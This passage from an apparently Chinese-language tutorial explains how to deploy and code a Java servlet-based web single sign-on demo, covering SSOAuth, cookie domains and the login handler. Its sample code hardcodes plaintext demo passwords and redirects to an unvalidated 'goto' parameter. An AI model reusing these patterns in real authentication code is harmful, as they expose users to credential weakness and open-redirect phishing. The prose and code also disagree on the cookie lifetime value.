<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">Web-SSO</span><span style="font-size:12pt">的样例是由三个标准</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用组成，压缩成三个</span><span style="font-size:12pt">zip</span><span style="font-size:12pt">文件，从</span><span style="font-size:12pt"><a target="_blank" href="http://gceclub.sun.com.cn/wangyu/" style="color:rgb(119,0,0); text-decoration:none">http://gceclub.sun.com.cn/wangyu/web-sso</a>/</span><span style="font-size:12pt">中下载。其中</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">（</span><span style="font-size:12pt"><a target="_blank" href="http://gceclub.sun.com.cn/wangyu/" style="color:rgb(119,0,0); text-decoration:none">http://gceclub.sun.com.cn/wangyu/web-sso/SSOAuth.zip</a></span><span style="font-size:12pt">）是身份认证服务；</span><span style="font-size:12pt">SSOWebDemo1</span><span style="font-size:12pt">（</span><span style="font-size:12pt"><a target="_blank" href="http://gceclub.sun.com.cn/wangyu/" style="color:rgb(119,0,0); text-decoration:none">http://gceclub.sun.com.cn/wangyu/web-sso/SSOWebDemo1.zip</a></span><span style="font-size:12pt">）和</span><span style="font-size:12pt">SSOWebDemo2</span><span style="font-size:12pt">（</span><span style="font-size:12pt"><a target="_blank" href="http://gceclub.sun.com.cn/wangyu/" style="color:rgb(119,0,0); text-decoration:none">http://gceclub.sun.com.cn/wangyu/web-sso/SSOWebDemo2.zip</a></span><span style="font-size:12pt">）是两个用来演示单点登录的</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用。这三个</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用之所以没有打成</span><span style="font-size:12pt">war</span><span style="font-size:12pt">包，是因为它们不能直接部署，根据读者的部署环境需要作出小小的修改。样例部署和运行的环境有一定的要求，需要符合</span><span style="font-size:12pt">Servlet2.3</span><span style="font-size:12pt">以上标准的</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">容器才能运行（例如</span><span style="font-size:12pt">Tomcat5,Sun&#13;
 Application Server 8, Jboss 4</span><span style="font-size:12pt">等）。另外，身份认证服务需要</span><span style="font-size:12pt">JDK1.5</span><span style="font-size:12pt">的运行环境。之所以要用</span><span style="font-size:12pt">JDK1.5</span><span style="font-size:12pt">是因为笔者使用了一个线程安全的高性能的</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">集合类“</span><span style="font-size:12pt">ConcurrentMap”</span><span style="font-size:12pt">，只有在</span><span style="font-size:12pt">JDK1.5</span><span style="font-size:12pt">中才有。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">这三个</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用完全可以单独部署，它们可以分别部署在不同的机器，不同的操作系统和不同的</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">的产品上，它们完全是标准的和平台无关的应用。但是有一个限制，那两台部署应用（</span><span style="font-size:12pt">demo1</span><span style="font-size:12pt">、</span><span style="font-size:12pt">demo2</span><span style="font-size:12pt">）的机器的域名需要相同，这在后面的章节中会解释到</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">和</span><span style="font-size:12pt">domain</span><span style="font-size:12pt">的关系以及如何制作跨域的</span><span style="font-size:12pt">WEB-SSO</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">解压缩</span><span style="font-size:12pt">SSOAuth.zip</span><span style="font-size:12pt">文件，在</span><span style="font-size:12pt">/WEB-INF/</span><span style="font-size:12pt">下的</span><span style="font-size:12pt">web.xml</span><span style="font-size:12pt">中请修改“</span><span style="font-size:12pt">domainname”</span><span style="font-size:12pt">的属性以反映实际的应用部署情况，</span><span style="font-size:12pt">domainname</span><span style="font-size:12pt">需要设置为两个单点登录的应用（</span><span style="font-size:12pt">demo1</span><span style="font-size:12pt">和</span><span style="font-size:12pt">demo2</span><span style="font-size:12pt">）所属的域名。这个</span><span style="font-size:12pt">domainname</span><span style="font-size:12pt">和当前</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">服务部署的机器的域名没有关系。我缺省设置的是“</span><span style="font-size:12pt">.sun.com”</span><span style="font-size:12pt">。如果你部署</span><span style="font-size:12pt">demo1</span><span style="font-size:12pt">和</span><span style="font-size:12pt">demo2</span><span style="font-size:12pt">的机器没有域名，请输入</span><span style="font-size:12pt">IP</span><span style="font-size:12pt">地址或主机名（如</span><span style="font-size:12pt">localhost</span><span style="font-size:12pt">），但是如果使用</span><span style="font-size:12pt">IP</span><span style="font-size:12pt">地址或主机名也就意味着</span><span style="font-size:12pt">demo1</span><span style="font-size:12pt">和</span><span style="font-size:12pt">demo2</span><span style="font-size:12pt">需要部署到一台机器上了。设置完后，根据你所选择的</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">容器，可能需要将</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">这个目录压缩打包成</span><span style="font-size:12pt">war</span><span style="font-size:12pt">文件。用“</span><span style="font-size:12pt">jar&#13;
 -cvf SSOAuth.war SSOAuth/”</span><span style="font-size:12pt">就可以完成这个功能。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">解压缩</span><span style="font-size:12pt">SSOWebDemo1</span><span style="font-size:12pt">和</span><span style="font-size:12pt">SSOWebDemo2</span><span style="font-size:12pt">文件，分别在它们</span><span style="font-size:12pt">/WEB-INF/</span><span style="font-size:12pt">下找到</span><span style="font-size:12pt">web.xml</span><span style="font-size:12pt">文件，请修改其中的几个初始化参数</span><span style="font-size:12pt"><br />&#13;
&lt;init-param&gt;<br />&#13;
&lt;param-name&gt;SSOServiceURL&lt;/param-name&gt;<br />&#13;
&lt;param-value&gt;<a target="_blank" href="http://wangyu.prc.sun.com:8080/SSOAuth/SSOAuth" style="color:rgb(119,0,0); text-decoration:none">http://wangyu.prc.sun.com:8080/SSOAuth/SSOAuth</a>&lt;/param-value&gt;<br />&#13;
&lt;/init-param&gt;<br />&#13;
&lt;init-param&gt;<br />&#13;
&lt;param-name&gt;SSOLoginPage&lt;/param-name&gt;<br />&#13;
&lt;param-value&gt;<a target="_blank" href="http://wangyu.prc.sun.com:8080/SSOAuth/login.jsp" style="color:rgb(119,0,0); text-decoration:none">http://wangyu.prc.sun.com:8080/SSOAuth/login.jsp</a>&lt;/param-value&gt;<br />&#13;
&lt;/init-param&gt;<br />&#13;
</span><span style="font-size:12pt">将其中的</span><span style="font-size:12pt">SSOServiceURL</span><span style="font-size:12pt">和</span><span style="font-size:12pt">SSOLoginPage</span><span style="font-size:12pt">修改成部署</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">应用的机器名、端口号以及根路径（缺省是</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">）以反映实际的部署情况。设置完后，根据你所选择的</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">容器，可能需要将</span><span style="font-size:12pt">SSOWebDemo1</span><span style="font-size:12pt">和</span><span style="font-size:12pt">SSOWebDemo2</span><span style="font-size:12pt">这两个目录压缩打包成两个</span><span style="font-size:12pt">war</span><span style="font-size:12pt">文件。用“</span><span style="font-size:12pt">jar&#13;
 -cvf SSOWebDemo1.war SSOWebDemo1/”</span><span style="font-size:12pt">就可以完成这个功能。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">请输入第一个</span><span style="font-size:12pt">web</span><span style="font-size:12pt">应用的测试</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">（</span><span style="font-size:12pt">test.jsp</span><span style="font-size:12pt">）</span><span style="font-size:12pt">,</span><span style="font-size:12pt">例如</span><span style="font-size:12pt">http://wangyu.prc.sun.com:8080/&#13;
 SSOWebDemo1/test.jsp</span><span style="font-size:12pt">，如果是第一次访问，便会自动跳转到登录界面，如下图</span><span style="font-size:12pt"><br />&#13;
<br />&#13;
<img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image014.gif" style="border:0px" /></span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">使用系统自带的三个帐号之一登录（例如，用户名：</span><span style="font-size:12pt">wangyu,</span><span style="font-size:12pt">密码：</span><span style="font-size:12pt">wangyu</span><span style="font-size:12pt">），便能成功的看到</span><span style="font-size:12pt">test.jsp</span><span style="font-size:12pt">的内容：显示当前用户名和欢迎信息。</span><span style="font-size:12pt"><br />&#13;
<img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image016.gif" style="border:0px" /></span></li></ul>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">请接着在同一个浏览器中输入第二个</span><span style="font-size:12pt">web</span><span style="font-size:12pt">应用的测试</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">（</span><span style="font-size:12pt">test.jsp</span><span style="font-size:12pt">）</span><span style="font-size:12pt">,</span><span style="font-size:12pt">例如</span><span style="font-size:12pt">http://wangyu.prc.sun.com:8080/&#13;
 SSOWebDemo2/test.jsp</span><span style="font-size:12pt">。你会发现，不需要再次登录就能看到</span><span style="font-size:12pt">test.jsp</span><span style="font-size:12pt">的内容，同样是显示当前用户名和欢迎信息，而且欢迎信息中明确的显示当前的应用名称（</span><span style="font-size:12pt">demo2</span><span style="font-size:12pt">）。</span></li></ul>&#13;
<div align="left" style="margin:0cm 0cm 12pt">             <img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image018.gif" style="border:0px" /></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><span style="font-size:13.5pt">3.2 WEB-SSO</span><span style="font-size:13.5pt">代码讲解</span></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt 36pt"><strong><span style="font-size:12pt">3.2.1</span><span style="font-size:12pt">身份认证服务代码解析</span></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">Web-SSO</span><span style="font-size:12pt">的源代码可以从网站地址</span><span style="font-size:12pt">http://gceclub.sun.com.cn/wangyu/web-sso/websso_src.zip</span><span style="font-size:12pt">下载。身份认证服务是一个标准的</span><span style="font-size:12pt">web</span><span style="font-size:12pt">应用，包括一个名为</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的</span><span style="font-size:12pt">Servlet</span><span style="font-size:12pt">，一个</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">文件和一个</span><span style="font-size:12pt">failed.html</span><span style="font-size:12pt">。身份认证的所有服务几乎都由</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的</span><span style="font-size:12pt">Servlet</span><span style="font-size:12pt">来实现了；</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">用来显示登录的页面（如果发现用户还没有登录过）；</span><span style="font-size:12pt">failed.html</span><span style="font-size:12pt">是用来显示登录失败的信息（如果用户的用户名和密码与信息数据库中的不一样）。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的代码如下面的列表显示，结构非常简单，先看看这个</span><span style="font-size:12pt">Servlet</span><span style="font-size:12pt">的主体部分<strong>：</strong></span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">package DesktopSSO;</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">import java.io.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import java.net.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import java.text.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import java.util.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import java.util.concurrent.*;</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">import javax.servlet.*;</span></div>&#13;
<div align="left"><span style="font-size:12pt">import javax.servlet.http.*;</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">public class SSOAuth extends HttpServlet {</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">static private ConcurrentMap accounts;</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">static private ConcurrentMap SSOIDs;</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">String cookiename="WangYuDesktopSSOID";</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">String domainname;</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">public void init(ServletConfig config) throws ServletException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">super.init(config);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">domainname= config.getInitParameter("domainname");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">cookiename = config.getInitParameter("cookiename");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">SSOIDs = new ConcurrentHashMap();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">accounts=new ConcurrentHashMap();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">accounts.put("wangyu", "wangyu");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">accounts.put("paul", "paul");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">accounts.put("carol", "carol");</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">PrintWriter out = response.getWriter();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String action = request.getParameter("action");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String result="failed";</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">if (action==null) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">handlerFromLogin(request,response);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} else if (action.equals("authcookie")){</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">String myCookie = request.getParameter("cookiename");</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">if (myCookie != null) result = authCookie(myCookie);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">out.print(result);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">out.close();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} else if (action.equals("authuser")) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">           </span><span style="font-size:12pt">result=authNameAndPasswd(request,response);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">out.print(result);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">out.close();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} else if (action.equals("logout")) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">String myCookie = request.getParameter("cookiename");</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">logout(myCookie);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">out.close();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">.....</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">从代码很容易看出，</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">就是一个简单的</span><span style="font-size:12pt">Servlet</span><span style="font-size:12pt">。其中有两个静态成员变量：</span><span style="font-size:12pt">accounts</span><span style="font-size:12pt">和</span><span style="font-size:12pt">SSOIDs</span><span style="font-size:12pt">，这两个成员变量都使用了</span><span style="font-size:12pt">JDK1.5</span><span style="font-size:12pt">中线程安全的</span><span style="font-size:12pt">MAP</span><span style="font-size:12pt">类：&#13;
 ConcurrentMap</span><span style="font-size:12pt">，所以这个样例一定要</span><span style="font-size:12pt">JDK1.5</span><span style="font-size:12pt">才能运行。</span><span style="font-size:12pt">Accounts</span><span style="font-size:12pt">用来存放用户的用户名和密码，在</span><span style="font-size:12pt">init()</span><span style="font-size:12pt">的方法中可以看到我给系统添加了三个合法的用户。在实际应用中，</span><span style="font-size:12pt">accounts</span><span style="font-size:12pt">应该是去数据库中或</span><span style="font-size:12pt">LDAP</span><span style="font-size:12pt">中获得，为了简单起见，在本样例中我使用了</span><span style="font-size:12pt">ConcurrentMap</span><span style="font-size:12pt">在内存中用程序创建了三个用户。而</span><span style="font-size:12pt">SSOIDs</span><span style="font-size:12pt">保存了在用户成功的登录后所产生的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">和用户名的对应关系。它的功能显而易见：当用户成功登录以后，再次访问别的系统，为了鉴别这个用户请求所带的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的有效性，需要到</span><span style="font-size:12pt">SSOIDs</span><span style="font-size:12pt">中检查这样的映射关系是否存在。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">在主要的请求处理方法</span><span style="font-size:12pt">processRequest()</span><span style="font-size:12pt">中，可以很清楚的看到</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的所有功能</span></div>&#13;
<ol type="1" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">如果用户还没有登录过，是第一次登录本系统，会被跳转到</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">页面（在后面会解释如何跳转）。用户在提供了用户名和密码以后，就会用</span><span style="font-size:12pt">handlerFromLogin()</span><span style="font-size:12pt">这个方法来验证。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">如果用户已经登录过本系统，再访问别的应用的时候，是不需要再次登录的。因为浏览器会将第一次登录时产生的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">和请求一起发送。效验</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的有效性是</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的主要功能之一。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">还能直接效验非</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">页面过来的用户名和密码的效验请求。这个功能是用于非</span><span style="font-size:12pt">web</span><span style="font-size:12pt">应用的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，这在后面的桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">中会用到。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">还提供</span><span style="font-size:12pt">logout</span><span style="font-size:12pt">服务。</span></li></ol>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">下面看看几个主要的功能函数：</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt"> </span><span style="font-size:12pt">private void handlerFromLogin(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String username = request.getParameter("username");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String password = request.getParameter("password");</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String pass = (String)accounts.get(username);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">if ((pass==null)||(!pass.equals(password)))</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">getServletContext().getRequestDispatcher("/failed.html").forward(request, response);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">else {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">String gotoURL = request.getParameter("goto");</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">String newID = createUID();</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">SSOIDs.put(newID, username);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">Cookie wangyu = new Cookie(cookiename, newID);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">wangyu.setDomain(domainname);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">wangyu.setMaxAge(60000);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">wangyu.setValue(newID);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">wangyu.setPath("/");</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">response.addCookie(wangyu);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">System.out.println("login success, goto back url:" + gotoURL);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">if (gotoURL != null) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">PrintWriter out = response.getWriter();</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">response.sendRedirect(gotoURL);</span></div>&#13;
<div align="left"><span style="font-size:12pt">                </span><span style="font-size:12pt">out.close();</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}  </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">handlerFromLogin()</span><span style="font-size:12pt">这个方法是用来处理来自</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">的登录请求。它的逻辑很简单：将用户输入的用户名和密码与预先设定好的用户集合（存放在</span><span style="font-size:12pt">accounts</span><span style="font-size:12pt">中）相比较，如果用户名或密码不匹配的话，则返回登录失败的页面（</span><span style="font-size:12pt">failed.html</span><span style="font-size:12pt">），如果登录成功的话，需要为用户当前的</span><span style="font-size:12pt">session</span><span style="font-size:12pt">创建一个新的</span><span style="font-size:12pt">ID</span><span style="font-size:12pt">，并将这个</span><span style="font-size:12pt">ID</span><span style="font-size:12pt">和用户名的映射关系存放到</span><span style="font-size:12pt">SSOIDs</span><span style="font-size:12pt">中，最后还要将这个</span><span style="font-size:12pt">ID</span><span style="font-size:12pt">设置为浏览器能够保存的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">值。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">登录成功后，浏览器会到哪个页面呢？那我们回顾一下我们是如何使用身份认证服务的。一般来说我们不会直接访问身份服务的任何</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">，包括</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">。身份服务是用来保护其他应用服务的，用户一般在访问一个受</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">保护的</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用的某个</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">时，当前这个应用会发现当前的用户还没有登录，便强制将也页面转向</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">，让用户登录。如果登录成功后，应该自动的将用户的浏览器指向用户最初想访问的那个</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">。在</span><span style="font-size:12pt">handlerFromLogin()</span><span style="font-size:12pt">这个方法中，我们通过接收</span><span style="font-size:12pt">“</span><span style="font-size:12pt">goto”</span><span style="font-size:12pt">这个参数来保存用户最初访问的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">，成功后便重新定向到这个页面中。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">另外一个要说明的是，在设置</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的时候，我使用了一个setMaxAge(6000)</span><span style="font-size:12pt">的方法。这个方法是用来设置</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的有效期，单位是秒。如果不使用这个方法或者参数为负数的话，当浏览器关闭的时候，这个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">就失效了。在这里我给了很大的值（</span><span style="font-size:12pt">1000</span><span style="font-size:12pt">分钟），导致的行为是：当你关闭浏览器（或者关机），下次再打开浏览器访问刚才的应用，只要在</span><span style="font-size:12pt">1000</span><span style="font-size:12pt">分钟之内，就不需要再登录了。我这样做是下面要介绍的桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">中所需要的功能。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">其他的方法更加简单，这里就不多解释了。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt 36pt"><strong><span style="font-size:12pt">3.2.2</span><span style="font-size:12pt">具有</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">功能的</span><span style="font-size:12pt">web</span><span style="font-size:12pt">应用源代码解析</span></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">要实现</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">的功能，只有身份认证服务是不够的。这点很显然，要想使多个应用具有单点登录的功能，还需要每个应用本身的配合：将自己的身份认证的服务交给一个统一的身份认证服务－</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">。</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">服务中提供的各个方法就是供每个加入</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用来调用的。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">一般来说，</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用需要</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的功能，应该通过以下的交互过程来调用身份认证服务的提供的认证服务：</span></div>&#13;
<ul type="disc" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用中每一个需要安全保护的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">在访问以前，都需要进行安全检查，如果发现没有登录（没有发现认证之后所带的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">），就重新定向到</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">中的</span><span style="font-size:12pt">login.jsp</span><span style="font-size:12pt">进行登录。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">登录成功后，系统会自动给你的浏览器设置</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">，证明你已经登录过了。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">当你再访问这个应用的需要保护的</span><span style="font-size:12pt">URL</span><span style="font-size:12pt">的时候，系统还是要进行安全检查的，但是这次系统能够发现相应的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:disc"><span style="font-size:12pt">有了这个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">，还不能证明你就一定有权限访问。因为有可能你已经</span><span style="font-size:12pt">logout,</span><span style="font-size:12pt">或者</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">已经过期了，或者身份认证服务重起过，这些情况下，你的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">都可能无效。应用系统拿到这个</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">，还需要调用身份认证的服务，来判断</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">时候真的有效，以及当前的</span><span style="font-size:12pt">cookie</span><span 